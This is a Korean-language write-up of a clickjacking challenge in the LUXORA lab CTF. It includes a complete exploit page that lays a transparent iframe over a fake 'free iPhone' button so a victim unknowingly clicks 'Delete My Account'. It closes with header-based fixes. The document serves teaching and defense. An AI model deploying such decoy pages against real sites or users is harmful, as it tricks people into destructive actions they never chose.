+++
title = "VulnABLE CTF [LUXORA] Write-up: Clickjacking 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Clickjacking", "Bronze", "UI Redressing", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Clickjacking 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Client-Side Layer (Clickjacking)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/clickjack/bronze`
- **목표**: 타겟 페이지(계정 삭제 버튼 등)를 해커의 악성 페이지 내부에 투명한 `iframe`으로 띄운 뒤, 피해자가 아무 의심 없이 클릭하게 만들어 원치 않는 액션을 실행하도록 유도(UI Redressing)하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/clickjack/bronze` 페이지는 "Delete My Account(내 계정 삭제)" 라는 아주 위험한 버튼이 있는 페이지입니다.

**[해커의 사고 과정]**
1. 이 "계정 삭제" 버튼을 다른 사람이 누르게 만들고 싶다.
2. CSRF 토큰이나 복잡한 검증이 걸려 있어서 단순 POST 요청으로는 안 된다. 피해자가 **직접 저 버튼을 누르게** 해야 한다.
3. 이 페이지가 다른 도메인의 `iframe` 안에 삽입되는 것을 허용할까?
4. HTTP 응답 헤더를 확인해보자.

**[서버 응답 헤더 확인]**
```http
HTTP/1.1 200 OK
Content-Type: text/html
// X-Frame-Options 헤더가 없음!
// Content-Security-Policy: frame-ancestors 지시자도 없음!
```

**[해석 및 결론]**
타겟 웹 서버가 자신의 페이지를 다른 웹사이트가 `iframe`으로 불러오는 것을 막지 않고 있습니다(프레임 방어 부재). 완벽한 **클릭재킹(Clickjacking)** 환경입니다!

---

## 💥 2. 취약점 식별 및 악성 페이지 제작 (Exploitation)

클릭재킹은 **UI Redressing**이라고도 불립니다. 해커의 사이트 위에 타겟 사이트를 투명하게 올려두고, 해커의 버튼(예: "당첨 확인")을 누를 때 실제로는 투명하게 겹쳐진 타겟 사이트의 버튼("계정 삭제")이 눌리도록 만드는 기법입니다.

### 💡 악성 HTML(Exploit) 작성
해커 서버(`evil-attacker.com`)에 다음과 같은 HTML 파일을 만듭니다.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Win a Free iPhone!</title>
    <style>
        /* 타겟 사이트를 감싸는 iframe의 스타일 */
        #target_website {
            position: absolute;
            top: 0;
            left: 0;
            width: 800px;
            height: 600px;
            /* 핵심: 투명도를 0으로 만들어 아예 안 보이게 함 (테스트 시엔 0.5로 두고 위치를 맞춤) */
            opacity: 0.0001; 
            z-index: 2; /* 해커의 버튼보다 위에 배치 */
        }

        /* 해커가 보여줄 가짜 미끼 버튼 */
        #decoy_button {
            position: absolute;
            /* 타겟 사이트의 "Delete Account" 버튼 위치와 정확히 겹치도록 top, left를 세밀하게 조절 */
            top: 250px; 
            left: 300px;
            z-index: 1; /* iframe보다 아래에 배치 */
            padding: 20px 40px;
            font-size: 24px;
            background-color: red;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Click the button below to claim your free iPhone!</h1>
    
    <!-- 가짜 버튼 (시각적 미끼) -->
    <button id="decoy_button">CLAIM PRIZE NOW!</button>
    
    <!-- 투명하게 덮어씌운 진짜 타겟 사이트 -->
    <iframe id="target_website" src="http://localhost:3000/clickjack/bronze"></iframe>
</body>
</html>
```

---

## 🚀 3. 공격 수행 및 결과 확인

### Step 1. 링크 전송 및 희생자 접속
이 페이지의 링크를 피해자(Admin)에게 보냅니다. 피해자가 링크를 열면, 화면에는 거대한 빨간색 "CLAIM PRIZE NOW!" 버튼만 보입니다.

### Step 2. 클릭 유도 (Action Triggered)
피해자가 경품을 받기 위해 빨간 버튼을 클릭합니다.
하지만 실제로는 빨간 버튼 '위'에 투명하게 덮여 있는 럭소라 사이트의 **"Delete My Account"** 버튼이 클릭됩니다!

### 🔍 서버의 응답
피해자의 브라우저는 계정 삭제 요청을 타겟 서버로 전송합니다. 서버는 사용자가 정상적으로 버튼을 클릭한 것이라 인식하고 계정을 삭제합니다.

```text
[!] System: Account deletion triggered via Clickjacking.
FLAG: FLAG{CLICKJACK_🥉_UI_REDRESS_B4C5D6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

브라우저의 렌더링 레이어(z-index)와 투명도(opacity)를 조작하여, 사용자의 시각을 속이고 의도치 않은 중대한 조작을 유발하는 UI Redressing 공격을 성공시켰습니다.

**🔥 획득한 플래그:**
`FLAG{CLICKJACK_🥉_UI_REDRESS_B4C5D6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
내 웹사이트를 다른 악성 웹사이트가 `iframe` 안으로 끌어들이는 것을 막지 않았기 때문에 발생한 문제입니다.

* **안전한 패치 가이드 (HTTP 헤더 설정)**

1. **X-Frame-Options 헤더 설정 (레거시 방어)**
   서버 응답 헤더에 아래 값을 추가하여 프레임 삽입을 막습니다.
   - `X-Frame-Options: DENY` (모든 도메인에서 내 사이트를 iframe으로 띄우는 것 금지)
   - `X-Frame-Options: SAMEORIGIN` (내 사이트 내부에서만 iframe 허용)

2. **Content-Security-Policy (CSP) 설정 (현대적 방어)**
   가장 강력하고 표준적인 방어법입니다.
   ```http
   Content-Security-Policy: frame-ancestors 'none';
   ```
   이 헤더가 세팅되면, 최신 브라우저는 해커가 `opacity: 0`으로 숨기든 말든 아예 타겟 사이트를 렌더링조차 하지 않고 차단해버립니다. 

(참고: 과거에는 자바스크립트로 `if (top != self) top.location = self.location;` 처럼 프레임 파괴(Frame Busting) 스크립트를 짜기도 했으나, 요즘은 브라우저 보안 정책에 의해 무력화되기 쉬우므로 헤더 설정이 필수입니다.)